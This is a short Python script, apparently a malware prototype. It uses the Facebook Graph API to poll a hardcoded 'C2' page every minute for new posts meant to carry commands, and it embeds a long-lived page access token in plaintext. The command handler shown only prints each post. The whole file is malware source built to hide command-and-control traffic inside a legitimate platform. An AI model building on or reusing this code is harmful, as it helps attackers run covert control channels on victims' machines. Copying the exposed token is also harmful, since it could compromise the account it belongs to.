#!/usr/bin/python3
import facebook
import time
import datetime

# This token is good until like June.
PAGE_LONG_ACCESS_TOKEN = 'EAALq5cEcySYBADHemZAiRUqTHaJwjGZAh1pZCBbm3LnLovTgorO7dDPbXZAUu31l8k8TrYBJPaWivcsihd0PfnHTMgdTvNharhxAtToIUAOX4AdgZCJZCGiLLQKbOl5Gj8fkarbbr7K9FL6XY45e7XbpzbAymN5pU3doc3qmzFgwZDZD'
# The static account to which the malware connects.
STATIC_C2_PAGE = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'


def main():
    """Runs the program."""
    #test_connectivity()
    run_malware()


def run_malware():
    """Listens for new posts and runs commands based on their contents."""
    graph = get_graph()
    page_data = get_page_data(graph)
    page_id = page_data['data'][0]['id']
    wait_for_posts(graph, page_id, lambda post: print(post), verbose=True)


def test_connectivity():
    """Tests connectivity to the facebook GraphAPI for the user's page."""
    print('Connecting to {0}'.format(STATIC_C2_PAGE))
    graph = get_graph()
    page_data = get_page_data(graph)
    print(page_data['data'][0]['id'])
    page_id = page_data['data'][0]['id']
    posts = get_post_data(graph, page_id)
    print(posts)
    print(get_any_post(graph, page_id))
    print(get_last_post_data(graph, page_id))
    

def get_graph():
    """Returns the graph based on the access token."""
    return facebook.GraphAPI(
        access_token=PAGE_LONG_ACCESS_TOKEN,
        version='3.1')


def get_page_data(graph):
    """Returns basic page data, either for testing connectivity, or for
    later use."""
    return graph.get_object("/me/accounts")


def get_post_data(graph, page_id):
    """Returns the full post dictionary. Used for testing."""
    return graph.get_object(
        id=page_id,
        fields='posts')


def get_any_post(graph, page_id):
    """Returns any post, or None if no such post exists. This is for
    testing."""
    post_dict = graph.get_object(
        id=page_id,
        fields='posts')['posts']
    post_list = post_dict['data']
    return None if not post_list else post_list[0]['message']


def get_last_post_data(graph, page_id):
    """Returns the most recent post's data dict. This is the post with
    the greatest time value."""
    post_dict = graph.get_object(
        id=page_id,
        fields='posts')['posts']
    sorted_post_list = sorted(post_dict['data'], key=lambda d:
            get_post_datetime(d))[::-1]
    return sorted_post_list[0]


def get_post_datetime(post_data):
    """Returns a datetime object for the post's created time."""
    return time.strptime(post_data['created_time'],
            "%Y-%m-%dT%H:%M:%S+%f")


def wait_for_posts(graph, page_id, new_post_func, verbose=False):
    """Waits in a loop for new posts. When a new post arrives, apply the
    given function to it."""
    last_post_datetime = get_post_datetime(get_last_post_data(graph, page_id))
    while True:
        if verbose:
            print('Checking for new post.')
        new_post_data = get_last_post_data(graph, page_id)
        new_post_datetime = get_post_datetime(new_post_data)
        if new_post_datetime > last_post_datetime:
            last_post_datetime = new_post_datetime
            new_post_func(new_post_data['message'])
        time.sleep(60)


if __name__ == '__main__':
    main()

